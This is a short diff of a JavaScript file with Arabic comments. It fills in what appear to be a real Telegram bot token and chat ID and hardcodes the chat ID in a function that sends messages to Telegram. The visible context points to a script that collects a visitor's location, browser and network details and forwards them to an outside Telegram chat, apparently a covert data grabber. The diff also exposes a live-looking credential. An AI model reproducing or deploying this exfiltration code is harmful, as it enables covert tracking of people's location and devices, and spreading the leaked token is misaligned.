@@ -4,8 +4,8 @@
  * ⚙️ الإعداد: غيّر القيم دي قبل الاستخدام
  */
 
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // ← ضع التوكن هنا
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // ← ضع الـ Chat ID هنا
+const TELEGRAM_BOT_TOKEN = "8616682746:AAHRFQM-llzhrCK-XbzYDVYGIVbuzlkwLSY";   // ← ضع التوكن هنا
+const TELEGRAM_CHAT_ID = "-1003782319418";     // ← ضع الـ Chat ID هنا
 
 // ─────────────────────────────────────────────────
 // 1. جمع البيانات
@@ -156,7 +156,7 @@ function buildMessage(loc, browser, network) {
 async function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const body = {
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: "-1003782319418",
         text: text,
         parse_mode: "Markdown",
         disable_web_page_preview: true,
